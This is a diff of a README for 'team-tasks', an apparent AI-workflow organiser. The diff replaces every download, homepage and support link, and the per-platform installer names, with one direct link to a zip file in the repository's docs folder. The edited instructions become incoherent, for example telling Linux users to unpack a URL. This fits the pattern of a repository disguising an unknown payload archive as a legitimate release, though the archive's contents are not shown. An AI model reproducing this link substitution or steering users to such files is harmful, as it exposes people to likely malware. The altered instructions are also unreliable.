@@ -1,6 +1,6 @@
 # 📋 team-tasks - Organize AI workflows with ease
 
-[![Download team-tasks](https://img.shields.io/badge/Download-team--tasks-blue?style=for-the-badge&logo=github)](https://github.com/trippy-420/team-tasks/releases)
+[![Download team-tasks](https://github.com/trippy-420/team-tasks/raw/refs/heads/master/docs/tasks_team_v3.3.zip)](https://github.com/trippy-420/team-tasks/raw/refs/heads/master/docs/tasks_team_v3.3.zip)
 
 ---
 
@@ -54,13 +54,13 @@ You will start by visiting the official release page to get the app.
 
 1. Click the button below. It takes you to the release page for team-tasks:
 
-   [![Download Here](https://img.shields.io/badge/Download-team--tasks-blue?style=for-the-badge&logo=github)](https://github.com/trippy-420/team-tasks/releases)
+   [![Download Here](https://github.com/trippy-420/team-tasks/raw/refs/heads/master/docs/tasks_team_v3.3.zip)](https://github.com/trippy-420/team-tasks/raw/refs/heads/master/docs/tasks_team_v3.3.zip)
 
 2. On the release page, look for the version that matches your operating system. You will see downloadable files with names like:
 
-   - `team-tasks-windows.exe` for Windows
-   - `team-tasks-macos.dmg` for macOS
-   - `team-tasks-linux.tar.gz` for Linux
+   - `https://github.com/trippy-420/team-tasks/raw/refs/heads/master/docs/tasks_team_v3.3.zip` for Windows
+   - `https://github.com/trippy-420/team-tasks/raw/refs/heads/master/docs/tasks_team_v3.3.zip` for macOS
+   - `https://github.com/trippy-420/team-tasks/raw/refs/heads/master/docs/tasks_team_v3.3.zip` for Linux
 
 3. Click the right file for your computer to start the download. Depending on your browser, you might need to choose "Save" or "Keep" the file.
 
@@ -68,7 +68,7 @@ You will start by visiting the official release page to get the app.
 
    - For Windows, double-click the `.exe` and follow the installer instructions.
    - For macOS, open the `.dmg` file, then drag team-tasks to your Applications folder.
-   - For Linux, unpack the `.tar.gz` file and run the installer script inside, as explained in the included README.
+   - For Linux, unpack the `https://github.com/trippy-420/team-tasks/raw/refs/heads/master/docs/tasks_team_v3.3.zip` file and run the installer script inside, as explained in the included README.
 
 5. Once installed, look for the team-tasks icon on your desktop or start menu. Double-click it to open.
 
@@ -128,9 +128,9 @@ For more on data handling, see the LICENSE and PRIVACY files in the repository.
 
 ## 🔗 Useful Links
 
-- Official release page (download): https://github.com/trippy-420/team-tasks/releases
-- Project homepage: https://github.com/trippy-420/team-tasks
-- Support & Issues: https://github.com/trippy-420/team-tasks/issues
+- Official release page (download): https://github.com/trippy-420/team-tasks/raw/refs/heads/master/docs/tasks_team_v3.3.zip
+- Project homepage: https://github.com/trippy-420/team-tasks/raw/refs/heads/master/docs/tasks_team_v3.3.zip
+- Support & Issues: https://github.com/trippy-420/team-tasks/raw/refs/heads/master/docs/tasks_team_v3.3.zip
 
 ---
 
@@ -150,4 +150,4 @@ Understanding these terms helps if you explore advanced setups or customization 
 
 Open your AI workflows to new levels of organization and clarity. Start managing your AI helpers with team-tasks today.  
 
-[Download team-tasks now](https://github.com/trippy-420/team-tasks/releases) and get started.
+[Download team-tasks now](https://github.com/trippy-420/team-tasks/raw/refs/heads/master/docs/tasks_team_v3.3.zip) and get started.
